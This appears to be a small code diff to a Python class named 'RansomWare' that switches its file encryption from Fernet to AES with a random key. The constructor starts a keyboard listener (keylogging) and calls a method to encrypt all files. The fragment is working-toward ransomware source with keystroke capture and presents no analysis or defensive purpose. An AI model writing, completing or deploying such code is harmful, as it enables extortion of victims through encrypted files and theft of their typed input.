@@ -1,14 +1,15 @@
-import os
 import time
 import threading
 from cryptography.fernet import Fernet
 from pynput import keyboard
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 
 class RansomWare:
     
     def __init__(self):
-        self.key = Fernet.generate_key()
-        self.crypter = Fernet(self.key)
+        self.key = get_random_bytes(16)
+        self.crypter = AES.new(self.key, AES.MODE_EAX)
         self.is_running = True
         self.keyboard_listener()
         self.encrypt_all_files()
